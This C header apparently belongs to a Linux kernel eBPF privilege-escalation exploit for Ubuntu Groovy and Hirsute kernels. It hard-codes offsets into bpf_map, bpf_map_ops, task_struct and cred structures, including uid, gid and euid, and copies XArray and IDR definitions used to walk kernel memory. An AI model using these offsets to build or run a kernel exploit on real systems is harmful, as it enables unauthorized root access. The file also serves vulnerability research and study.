#ifndef _KERNEL_DEFS__H_
#define _KERNEL_DEFS__H_

#define KERNEL_BASE                    0xFFFF000000000000
#define KERNEL_DS                      0xFFFFFFFFFFFFFFFF
#define IS_KERNEL_POINTER(x)           (((x > KERNEL_BASE) && (x < KERNEL_DS))?1:0)

// Backwards offset of ops field in bpf_map from start of map values memory chunk
#define BPF_MAP_OPS_OFFSET           0x110
// Backwards offset of btf field in bpf_map from start map values memory chunk
#define BPF_MAP_BTF_OFFSET           0xD0
// Backwards offset of spin_lock_off field in bpf_map from start of map values memory chunk
#define BPF_MAP_SPIN_LOCK_OFF_OFFSET 0xE4
// Backwards offset of max_entries field in bpf_map from start of map values memory chunk
#define BPF_MAP_MAX_ENTRIES_OFFSET   0xEC
// Backwards offset of map_type field in bpf_map from start of map values memory chunk
#define BPF_MAP_TYPE_OFFSET          0xF8

// Offset of map_get_next_key function pointer in bpf_map_ops
#define MAP_OPS_GET_NEXT_KEY_OFFSET 0x20
// Offset of map_push_elem function pointer in bpf_map_ops
#define MAP_OPS_PUSH_ELEM_OFFSET    0x70

// Offset of id field in btf struct
#define BTF_ID_OFFSET 0x58

// Offset of tasks field in pid structure
#define PID_TASKS_OFFSET 0x10

// Offset of linked list entry in task_struct
#ifdef GROOVY
#define TASK_LIST_OFFSET  0x950
#endif
#ifdef HIRSUTE
#define TASK_LIST_OFFSET  0x578
#endif
// Offset of cred pointer in task_struct
#ifdef GROOVY
#define TASK_CRED_OFFSET  0xA88
#endif
#ifdef HIRSUTE 
#define TASK_CRED_OFFSET  0x6C8
#endif

// Offset of uid field in cred structure
#define CRED_UID_OFFSET  0x4
// Offset of gid field in cred structure
#define CRED_GID_OFFSET  0x8
// Offset of euid field in cred structure
#define CRED_EUID_OFFSET 0x14


// Copied from Linux Kernel source

#define XA_CHUNK_SHIFT 0x6
#define XA_CHUNK_SIZE  0x40

#define XA_RETRY_ENTRY xa_mk_internal(256)

#define RADIX_TREE_RETRY       XA_RETRY_ENTRY
#define RADIX_TREE_MAP_SHIFT   XA_CHUNK_SHIFT
#define RADIX_TREE_MAP_SIZE    (1UL << RADIX_TREE_MAP_SHIFT)
#define RADIX_TREE_MAP_MASK    (RADIX_TREE_MAP_SIZE-1)


/*
 * The bottom two bits of the slot determine how the remaining bits in the
 * slot are interpreted:
 *
 * 00 - data pointer
 * 10 - internal entry
 * x1 - value entry
 *
 * The internal entry may be a pointer to the next level in the tree, a
 * sibling entry, or an indicator that the entry in this slot has been moved
 * to another location in the tree and the lookup should be restarted.  While
 * NULL fits the 'data pointer' pattern, it means that there is no entry in
 * the tree for this index (no matter what level of the tree it is found at).
 * This means that storing a NULL entry in the tree is the same as deleting
 * the entry from the tree.
 */
#define RADIX_TREE_ENTRY_MASK    3UL
#define RADIX_TREE_INTERNAL_NODE 2UL


/**
 * struct xarray - The anchor of the XArray.
 * @xa_lock: Lock that protects the contents of the XArray.
 *
 * To use the xarray, define it statically or embed it in your data structure.
 * It is a very small data structure, so it does not usually make sense to
 * allocate it separately and keep a pointer to it in your data structure.
 *
 * You may use the xa_lock to protect your own data structures as well.
 */
/*
 * If all of the entries in the array are NULL, @xa_head is a NULL pointer.
 * If the only non-NULL entry in the array is at index 0, @xa_head is that
 * entry.  If any other entry in the array is non-NULL, @xa_head points
 * to an @xa_node.
 */
struct xarray 
{
    int32_t    xa_lock;
    int32_t    xa_flags;
    void     *xa_head;
};


/*
 * xa_mk_internal() - Create an internal entry.
 * @v: Value to turn into an internal entry.
 *
 * Internal entries are used for a number of purposes.  Entries 0-255 are
 * used for sibling entries (only 0-62 are used by the current code).  256
 * is used for the retry entry.  257 is used for the reserved / zero entry.
 * Negative internal entries are used to represent errnos.  Node pointers
 * are also tagged as internal entries in some situations.
 *
 * Context: Any context.
 * Return: An XArray internal entry corresponding to this value.
 */
static inline void *xa_mk_internal(unsigned long v)
{
    return (void *)((v << 2) | 2);
}

#define radix_tree_root        xarray
#define radix_tree_node        xa_node


struct xa_node 
{
    unsigned char    shift;        /* Bits remaining in each slot */
    unsigned char    offset;       /* Slot offset in parent */
    unsigned char    count;        /* Total entry count */
    unsigned char    nr_values;    /* Value entry count */
    struct xa_node  *parent;       /* NULL at top of tree */
    struct xarray    *array;       /* The array we belong to */
    char filler[0x10];
    void *slots[XA_CHUNK_SIZE];
}; 

struct idr 
{
    struct radix_tree_root    idr_rt;
    unsigned int        idr_base;
    unsigned int        idr_next;
};

struct pid_namespace
{
#ifdef GROOVY
    uint64_t padding;
#endif
    struct idr idr;
};


#endif